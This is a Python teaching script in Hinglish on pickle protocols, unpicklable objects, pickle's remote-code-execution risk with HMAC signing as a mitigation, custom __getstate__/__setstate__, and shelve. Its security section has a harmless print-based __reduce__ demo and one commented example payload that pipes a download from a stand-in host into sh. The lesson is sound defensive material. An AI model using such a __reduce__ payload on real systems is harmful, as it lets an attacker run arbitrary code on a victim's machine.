"""
DAY 54 — Pickle Deep Dive + Security (RCE) + Custom Pickling + shelve
Architecture Level: Mid → Senior Python Backend (Security-critical)

WHY THIS MATTERS:
- pickle Python ka native object serialization hai — Celery, multiprocessing,
  joblib, kabhi-kabhi Redis cache sab internally use karte hain.
- pickle ka #1 gotcha: UNTRUSTED data unpickle karna = ARBITRARY CODE EXECUTION.
  Yeh interview aur security review dono me top question hai.
- Custom __getstate__/__setstate__ jaane bina locks/connections wale objects
  pickle karoge → crash. Yeh real production bug hai.

GOLDEN RULE:
    "pickle SIRF trusted source ka data unpickle karo. Trust boundary cross
     kare toh: ya toh sign (HMAC) karo, ya pickle hi mat use karo (JSON/protobuf)."
"""

import pickle
import pickletools  # noqa: F401  (inspection ke liye, optional)
import hashlib
import hmac
import shelve
import os
import threading


# ============ SECTION 1: Pickle Protocols (0-5) ============
#
# Protocol = wire format version. Higher = faster + more features, par naye
# Python pe hi readable. History:
#   0  : ASCII, human-readable, oldest, slowest (legacy)
#   1  : old binary
#   2  : Python 2.3+ — new-style classes ka efficient pickling
#   3  : Python 3.0+ — bytes support (Py2 nahi padh sakta)
#   4  : Python 3.4+ — large objects (>4GB), nested classes by qualname
#   5  : Python 3.8+ — OUT-OF-BAND buffers (zero-copy for big numpy/PEP 3118)
#
# DEFAULT_PROTOCOL per version (approx):
#   Py 3.0-3.7 → 3,   Py 3.8+ → 5 (DEFAULT_PROTOCOL), HIGHEST_PROTOCOL = 5
# Tip: cross-version compatibility chahiye toh protocol explicitly pin karo.

def demo_protocols():
    print("=" * 55)
    print("SECTION 1: Pickle protocols 0-5")
    print("=" * 55)

    print(f"  pickle.DEFAULT_PROTOCOL  = {pickle.DEFAULT_PROTOCOL}")
    print(f"  pickle.HIGHEST_PROTOCOL  = {pickle.HIGHEST_PROTOCOL}")

    data = {"id": 1, "tags": ["a", "b"], "score": 3.14}

    # Alag protocols me size compare karo
    for proto in range(0, pickle.HIGHEST_PROTOCOL + 1):
        blob = pickle.dumps(data, protocol=proto)
        print(f"  protocol {proto}: {len(blob):>4} bytes")

    # Best practice: HIGHEST_PROTOCOL jab tum control karte ho dono ends
    blob = pickle.dumps(data, protocol=pickle.HIGHEST_PROTOCOL)
    print(f"  round-trip (HIGHEST): {pickle.loads(blob)}")

    # Protocol 5 OUT-OF-BAND buffers (concept, numpy ke saath shine karta):
    #   buffers = []
    #   blob = pickle.dumps(big_numpy_arr, protocol=5,
    #                       buffer_callback=buffers.append)
    #   # array bytes 'buffers' list me out-of-band rahte (copy nahi hote in blob).
    #   # loads(blob, buffers=buffers) → zero-copy reconstruction. Bade arrays fast.
    print("  protocol 5: out-of-band buffers → bade numpy arrays zero-copy (commented)")


# ============ SECTION 2: Kya pickles, kya nahi ============
#
# Functions/classes by REFERENCE pickle hote hain — yaani sirf "module.qualname"
# store hota, code nahi. Unpickle ke waqt usi naam se IMPORT hota. Isliye:
#   - top-level function/class → OK (import-able naam hai)
#   - lambda → NO (koi naam nahi)
#   - closure / nested function → NO
#   - open file / socket / lock / db connection → NO (OS resource, serialize nahi)

def top_level_fn(x):
    return x * 2


def demo_what_pickles():
    print("\n" + "=" * 55)
    print("SECTION 2: Kya pickles / kya nahi")
    print("=" * 55)

    # Top-level function → by reference OK
    blob = pickle.dumps(top_level_fn)
    fn = pickle.loads(blob)
    print(f"  top-level fn pickled, fn(21) = {fn(21)}")

    # Lambda → FAILS
    try:
        pickle.dumps(lambda x: x + 1)
    except (pickle.PicklingError, AttributeError) as e:
        print(f"  lambda FAILED: {type(e).__name__} (no qualified name)")

    # Closure → FAILS
    def make_closure():
        secret = 10
        def inner(): return secret
        return inner
    try:
        pickle.dumps(make_closure())
    except (pickle.PicklingError, AttributeError) as e:
        print(f"  closure FAILED: {type(e).__name__}")

    # Open file → FAILS (OS resource)
    try:
        with open(__file__) as f:
            pickle.dumps(f)
    except (TypeError, pickle.PicklingError) as e:
        print(f"  open file FAILED: {type(e).__name__} (sockets/locks/connections bhi same)")


# ============ SECTION 3: SECURITY — pickle RCE (defensive) ============
#
# Unpickling DATA reading nahi hai — yeh OBJECTS RECONSTRUCT karta, aur __reduce__
# ke through ARBITRARY CALLABLE invoke kar sakta. Toh malicious pickle = code exec.

class HarmlessLookingPayload:
    """DEFENSIVE DEMO — yeh dikhata hai ki ek class apne unpickle pe code chala
    sakti hai. Hum `os.system` ki jagah `print` use kar rahe (NUKSAAN NAHI)."""
    def __reduce__(self):
        # __reduce__ unpickle ke waqt (callable, args) return karta.
        # Real attacker: return (os.system, ('curl evil.sh | sh',))
        # Hum demo me harmless: return (print, ('[PAYLOAD] yahan attacker code chalta',))
        return (print, ("[PAYLOAD] is line ka chalna = ARBITRARY CODE EXECUTION proof",))


def demo_pickle_rce():
    print("\n" + "=" * 55)
    print("SECTION 3: pickle RCE (defensive — print, not exec)")
    print("=" * 55)

    malicious_blob = pickle.dumps(HarmlessLookingPayload())
    print("  Ab is 'data' ko unpickle karte hain (jaise cache/queue se aaya ho):")
    pickle.loads(malicious_blob)   # __reduce__ ka callable yahan FIRE hota hai!
    print("  ^ Dekha? loads() ne sirf padha nahi — CODE chalaya. Yahi RCE hai.")

    print("\n  WHY unpickling untrusted data = code execution:")
    print("    __reduce__/__reduce_ex__ unpickle pe (callable, args) invoke karta.")
    print("    Attacker callable = os.system / subprocess.Popen / eval rakh deta.")

    print("\n  REAL-WORLD RULE:")
    print("    - Trust boundary ke aar paar kabhi pickle mat bhejo (user upload,")
    print("      external API, untrusted Redis/queue).")
    print("    - Agar pickle hi chahiye toh HMAC se sign karo (neeche), warna JSON/protobuf.")
    print("    - Celery: 'pickle' serializer purane Celery me default tha → RCE risk.")
    print("      Aaj 'json' default. Redis me agar app pickle dump kar raha hai aur")
    print("      Redis compromise ho jaaye → attacker poisoned pickle inject karke RCE.")

    # --- HMAC signing pattern (agar pickle MUST ho) ---
    SECRET = b"server-side-secret-key"
    def sign(blob: bytes) -> bytes:
        mac = hmac.new(SECRET, blob, hashlib.sha256).digest()
        return mac + blob
    def verify_and_load(signed: bytes):
        mac, blob = signed[:32], signed[32:]
        expected = hmac.new(SECRET, blob, hashlib.sha256).digest()
        if not hmac.compare_digest(mac, expected):   # constant-time compare
            raise ValueError("HMAC mismatch — tampered/untrusted, refuse to unpickle")
        return pickle.loads(blob)

    safe_blob = sign(pickle.dumps({"ok": True}))
    print(f"\n  HMAC-signed round-trip: {verify_and_load(safe_blob)}")
    tampered = safe_blob[:-1] + bytes([safe_blob[-1] ^ 0x01])
    try:
        verify_and_load(tampered)
    except ValueError as e:
        print(f"  tampered blob rejected: {e}")


# ============ SECTION 4: Custom Pickling — __getstate__/__setstate__/__reduce__ ============
#
# Jab object me un-picklable cheezein ho (lock, db connection, open file), tum
# __getstate__ se unhe EXCLUDE karte ho, aur __setstate__ me RE-INITIALIZE.

class DatabaseClient:
    """Real pattern: connection + lock pickle nahi ho sakte → exclude + re-init."""
    def __init__(self, dsn):
        self.dsn = dsn
        self._lock = threading.Lock()        # un-picklable!
        self._connection = f"<live-conn to {dsn}>"   # un-picklable resource (simulated)

    def __getstate__(self):
        # State dict banao bina un-picklable fields ke
        state = self.__dict__.copy()
        del state["_lock"]            # exclude lock
        del state["_connection"]      # exclude live connection
        return state

    def __setstate__(self, state):
        # Restore picklable state, phir un-picklable fields RE-INIT karo
        self.__dict__.update(state)
        self._lock = threading.Lock()
        self._connection = f"<live-conn to {self.dsn}>"   # reconnect


def demo_custom_pickling():
    print("\n" + "=" * 55)
    print("SECTION 4: __getstate__ / __setstate__")
    print("=" * 55)

    client = DatabaseClient("postgres://localhost/app")
    blob = pickle.dumps(client)                 # lock/conn excluded → success
    restored = pickle.loads(blob)               # __setstate__ reconnects
    print(f"  restored.dsn        = {restored.dsn}")
    print(f"  restored._lock      = {restored._lock}  (re-initialized)")
    print(f"  restored._connection= {restored._connection}  (reconnected)")
    print("  WHY: locks/connections OS-bound hain → state se nikaalo, setstate me banao.")

    print("\n  __reduce__ legitimate use: jab construction control chahiye —")
    print("    return (CallableToRebuild, (arg1, arg2)). C-extension objects, singletons,")
    print("    ya factory-rebuilt objects ke liye. (Untrusted side se daro — Section 3.)")


# ============ SECTION 5: shelve — persistent dict-of-pickles ============
#
# shelve = ek dict-jaisa object jo disk pe persist hota (keys str, values pickled).
# Internally: dbm file + pickle. Chhote local caches / CLI state ke liye handy.

def demo_shelve():
    print("\n" + "=" * 55)
    print("SECTION 5: shelve — persistent dict")
    print("=" * 55)

    path = "/tmp/day54_demo_shelf"
    # Cleanup pehle (dbm multiple files bana sakta)
    for suffix in ("", ".db", ".dat", ".bak", ".dir"):
        try: os.remove(path + suffix)
        except OSError: pass

    # writeback=False (default): value mutate karne pe wapas assign karna padta
    with shelve.open(path) as db:
        db["user:1"] = {"name": "ashish", "roles": ["admin"]}
        db["counter"] = 0
        # MUTATE TRAP (writeback=False): yeh persist NAHI hoga —
        db["user:1"]["roles"].append("editor")     # in-memory copy badli, disk nahi!
    with shelve.open(path) as db:
        print(f"  writeback=False, roles persisted: {db['user:1']['roles']}  "
              f"(<-- 'editor' GAYAB — mutation persist nahi hua)")

    # writeback=True: mutations track hote (cache me), close pe sync — PAR COST:
    #   saari accessed entries memory me cache hoti, close/sync slow + RAM heavy.
    with shelve.open(path, writeback=True) as db:
        db["user:1"]["roles"].append("editor")     # ab track hoga
        # close pe automatically write back
    with shelve.open(path) as db:
        print(f"  writeback=True, roles persisted:  {db['user:1']['roles']}  "
              f"(<-- ab 'editor' bach gaya)")

    print("\n  USE CASES: chhota local cache, CLI tool ka state, prototyping.")
    print("  LIMITS:")
    print("    - NO concurrency: do process ek saath likhein → corruption.")
    print("    - pickle security applies: shelve file untrusted ho to RCE risk.")
    print("    - writeback=True memory/perf cost (sab accessed entries cache).")
    print("  ALTERNATIVES: structured/portable data → JSON file; concurrent/queryable")
    print("                → sqlite3 (ACID, multi-reader). shelve sirf single-user local.")

    for suffix in ("", ".db", ".dat", ".bak", ".dir"):
        try: os.remove(path + suffix)
        except OSError: pass


# ============ INTERVIEW QUESTIONS ============
"""
Q1: pickle protocol kaunsa use karein aur kyun?
A : Dono ends tum control karte ho (same Python) → pickle.HIGHEST_PROTOCOL (Py3.8+ = 5,
    fastest + out-of-band buffers). Cross-version compat chahiye → lowest common protocol
    explicitly pin karo (e.g. 4). Protocol 5 bade numpy arrays ke liye zero-copy out-of-band
    buffers deta hai.

Q2: Kya kya pickle nahi hota?
A : lambda, nested/closure functions (qualified naam nahi), open files/sockets/locks/db
    connections (OS resources), generators, kuch C-extension objects. Top-level
    functions/classes BY REFERENCE pickle hote (module.qualname store), code nahi —
    unpickle pe wahi naam import hona chahiye.

Q3: pickle security risk kya hai? Untrusted data unpickle karna safe hai?
A : NAHI — unpickling arbitrary code execution hai. __reduce__ unpickle pe (callable, args)
    invoke karta; attacker callable = os.system/Popen rakh deta. Toh untrusted/user/external
    data kabhi pickle.loads mat karo. Zaroori ho to HMAC sign karke verify karo, ya JSON/protobuf
    use karo. Celery purane versions me pickle serializer = RCE vector tha.

Q4: Ek object me threading.Lock hai, pickle nahi ho raha — kya karein?
A : __getstate__ me __dict__.copy() lekar lock/connection delete karo (exclude), __setstate__
    me unhe re-initialize/reconnect karo. Yeh standard pattern hai un-picklable resources ke liye.

Q5: shelve writeback=True kab use karein, cost kya hai?
A : Jab nested/mutable values ko in-place mutate karna ho aur chahte ho changes persist hon.
    writeback=False me mutation persist nahi hota (reassign karna padta). Cost: writeback=True
    har accessed entry ko memory cache karta aur close/sync pe sab likhta → RAM + slow. Bade
    datasets pe avoid karo.

Q6: shelve ya sqlite/JSON — kab kaunsa?
A : shelve = single-user local persistent dict (CLI state, chhota cache). Concurrency NAHI,
    pickle security applies, portable nahi. Multi-process/queryable/ACID chahiye → sqlite3.
    Portable, human-readable, cross-language → JSON. Production shared state ke liye Redis/DB.
"""


if __name__ == "__main__":
    demo_protocols()
    demo_what_pickles()
    demo_pickle_rce()
    demo_custom_pickling()
    demo_shelve()
